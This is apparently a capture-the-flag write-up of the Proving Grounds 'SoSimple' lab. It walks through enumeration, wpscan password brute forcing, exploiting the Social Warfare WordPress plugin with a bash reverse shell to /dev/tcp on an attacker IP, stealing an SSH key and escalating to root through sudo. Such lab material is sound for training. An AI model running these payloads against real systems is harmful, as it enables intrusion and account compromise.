# PG Play - SoSimple

#### Ip: 10.10.199.225
#### Name: SoSimple
#### Difficulty: Intermediate
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ sudo nmap -p-  --min-rate 10000 192.168.188.78
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 12:03 CDT
Nmap scan report for 192.168.188.78
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ sudo nmap -sC -sV 192.168.188.78 -p 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 12:04 CDT
Nmap scan report for 192.168.188.78
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

Navigating to the webpage on port 80 we find a basic image:

![site.png](../assets/sosimple_assets/site.png)

And checking out the source code we find a comment:

note.png

Using Feroxbuster we find there is a page running WordPress:

ferox.png

Heading to that page we find a pretty generic WordPress site:

wp.png

Lets use wpscan to enumerate a but more:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ wpscan --url http://192.168.188.78/wordpress/ --enumerate vp,u,vt,tt


_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
```

Cool looks like we've found two usernames:

users.png

We can also bruteforce max's password using wpscan:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ wpscan --url http://192.168.188.78/wordpress/wp-login.php --usernames max --passwords /usr/share/wordlists/rockyou.txt

<snip>

[!] Valid Combinations Found:
 | Username: max, Password: opensesame
```

Logging into the site and checking out the page source we can see that there is a plugin called social warfare.

source.png

Searching for exploits I find: https://www.exploit-db.com/exploits/46794

Looking at the exploit it seems the path we can exploit is:

```text
wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
```

path.png

And it also seems we can use this to grab a reverse shell ending in .txt

### Exploitation

Lets create a file with a reverse shell one-liner and save it as payload.txt:

```text
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.45.197/443 0>&1'")</pre>
```

Now lets set up a python webserver:

```text
python -m http.server 80
```
As well as a netcat listener, and then naviagate to the following url:

http://192.168.188.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.197/payload.txt

Checking our python logs we can confirm the file has been downloaded:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.188.78 - - [15/Aug/2023 12:38:27] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
```

And we also catch a reverse shell back:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.197] from (UNKNOWN) [192.168.188.78] 35788
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
www-data@so-simple:/var/www/html/wordpress/wp-admin$ whoami
whoami
www-data
www-data@so-simple:/var/www/html/wordpress/wp-admin$ hostname
hostname
so-simple
```

Once on the target I find a copy of Max's SSH key, so I'll grab that and SSH in as Max for a more stable connection:

```text
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ chmod 600 id_rsa
                                                                                                                             
┌──(ryan㉿kali)-[~/PG/SoSimple]
└─$ ssh -i id_rsa max@192.168.188.78
```

We can now grag the local.txt flag:

local_flag.png

### Privilege Escalation

Running `sudo -l` to see what can be run with elevated permissions, we find we can run as user steven service with sudo.

We can head over to https://gtfobins.github.io/gtfobins/service/ and see what the syntax is to exploit this:

gtfo.png

Lets run:

```text
max@so-simple:~$ sudo -u steven service ../../bin/sh
$ whoami
steven
```

Nice, that worked! Lets see what steven can run with sudo:

```text
$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

Trying to inspect that file, we find it doesn't actually exist:

```text
$ cd /opt/tools
/etc/init.d/../../bin/sh: 3: cd: can't cd to /opt/tools
$ ls
bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   snap  swap.img  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
$ cd opt
$ ls
$ ls -la
total 8
drwxr-xr-x  2 steven steven 4096 Sep  3  2020 .
drwxr-xr-x 20 root   root   4096 Aug 14  2020 ..
```

Cool, so we should just be able to create our own file with the same name with a bash shell in it, make it executable, and then we can execute it using sudo, which will give us a root shell.

First, lets get a better prompt with `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Then we can run the following:

tools.png

Nice! We're root! Lets grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------
